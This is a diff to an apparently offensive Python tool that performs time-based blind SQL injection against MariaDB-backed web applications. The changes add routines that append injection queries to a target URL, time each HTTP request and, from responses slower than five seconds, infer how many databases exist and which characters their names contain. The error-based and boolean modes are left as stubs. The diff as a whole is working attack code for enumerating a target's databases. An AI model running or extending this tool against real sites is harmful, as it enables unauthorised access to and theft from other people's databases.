@@ -101,7 +101,6 @@ class MariaDBdatabase():
         # max num of databases to search.
         self.MAX_RANGE = 50
         self.attack = attack
-        print(self.attack)
 
     def search_database_names(self):
         self._search_num_database()
@@ -115,24 +114,46 @@ class MariaDBdatabase():
         """ Finds number of databases """
         # database query
         self.query = config.MariaDB.DATABASE_NUM.value
-        self.url = self.url + self.query
+        self.url_injection = self.url + self.query
         if(VERBOSE): print('Searching number of databases ...')
         for i in range(0, self.MAX_RANGE + 1):
             if(self.attack == "TIME"):
-                self.time = HTTPTimedRequest(self.url.format(i), self.header, self.data).send_request()
+                self.time = HTTPTimedRequest(self.url_injection.format(i), self.header, self.data).send_request()
                 if(self.time > 5):
                     self.database_num = i
-                    if(VERBOSE): print('\033[32m' + '[+] Number of databases found: {}'.format(i))
+                    if(VERBOSE): print('[+] Number of databases found: {}'.format(i))
             elif(self.attack == "ERROR"):
                 pass
             elif(self.attack == "BOOLEAN"):
                 pass
             else:
-                pass
+                print('Unsupported attack type.')
 
     def _search_database_name(self):
-        pass
+        self.char_set = self._search_character_set()
 
+
+    def _search_character_set(self):
+        """ Enumerates database names for chars used. """
+        self.legal_chars = config.Characters.INSENSITIVE_CHARS.value
+        self.query = config.MariaDB.DATABASE_NAME_CHAR.value
+        self.url_injection = self.url + self.query
+        self.char_set = []
+        if(VERBOSE): print('Searching possible database name characters ...')
+        for char in self.legal_chars:
+            if(self.attack == "TIME"):
+                self.time = HTTPTimedRequest(self.url_injection.format(hex(ord(char))), self.header, self.data).send_request()
+                if(self.time > 5):
+                    self.char_set.append(char)
+                    if(VERBOSE): print('[+] Database name character found: {}'.format(char))
+            elif(self.attack == "ERROR"):
+                pass
+            elif(self.attack == "BOOLEAN"):
+                pass
+            else:
+                print('Unsupported attack type.')
+        if(VERBOSE): print('[+] Full database character set found: {}'.format(self.char_set))
+        return self.char_set
 
 class MariaDBtable():
     pass
